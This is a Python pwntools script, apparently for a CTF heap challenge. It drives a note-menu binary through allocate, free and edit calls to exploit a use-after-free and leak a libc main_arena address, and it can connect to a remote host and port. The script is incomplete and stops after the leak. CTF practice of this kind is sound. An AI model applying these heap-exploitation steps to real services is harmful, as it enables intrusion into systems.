from pwn import * 
from pwn import p64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "182.148.156.200"
    r = connect(host,9135)#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x4012ed')
    gdb.attach(r)
    pause()
    pass


libc = ELF('./libc-2.32.so')
elf = ELF('./vuln')

def add_note(page , size):
    r.sendlineafter(b'Exit',b'1')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Size:', str(size).encode())

def delete_note(page):
    r.sendlineafter(b'Exit',b'2')
    r.sendlineafter(b'Index:', str(page).encode())

def edit_note(page , content):
    r.sendlineafter(b'Exit',b'3')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Content:' , content)

def show_note(page):
    r.sendlineafter(b'Exit',b'4')
    r.sendlineafter(b'Index:', str(page).encode())

for i in range(9):
    add_note(i,0x80)
for i in range(8):
    delete_note(i)
edit_note(7,b'a')
show_note(7)
main_arena_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) - 0x61 
print(f'main_arena_addr = {hex(main_arena_addr)}')
gdb.attach(r)
pause()
# r.sendlineafter()
# r.send()
# r.recvuntil()
r.interactive()
